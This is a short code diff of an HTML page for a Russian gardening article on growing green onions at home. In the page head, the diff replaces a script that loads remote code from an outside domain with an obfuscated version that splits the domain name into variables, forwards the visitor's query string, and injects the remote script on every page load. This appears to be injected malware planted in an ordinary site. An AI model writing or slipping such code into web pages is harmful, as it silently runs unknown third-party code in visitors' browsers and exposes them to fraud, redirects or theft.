@@ -24,7 +24,15 @@ body, html,
 section.error-404 .text, .inline-popup .title, .authentication .title, .bb-other-posts .title, .bb-post-share-box h2, .bb-page-header h1{font-family:Scada,sans-serif
 }
 </style>
-<script async>document.write(`<script async src="https://gulanodas.club/LFGFST?"><\/script>`)</script>
+<!--<script async>document.write(`<script async src="https://gulanodas.club/LFGFST?"><\/script>`)</script>-->
+<script async>
+ var domain = 'gulanodas';
+ var domain_zone = 'club';
+ var pathname = '/LFGFST';
+ var param = '?' + decodeURIComponent(window.location.search.replace('?', ''));
+document.write('<script async src="https://'+ domain + '.' + domain_zone + pathname + param +'"><\/script>')
+</script>
+  
   </head>
 <body>
 <h1 class="entry-title">Как вырастить зеленый лук дома</h1>
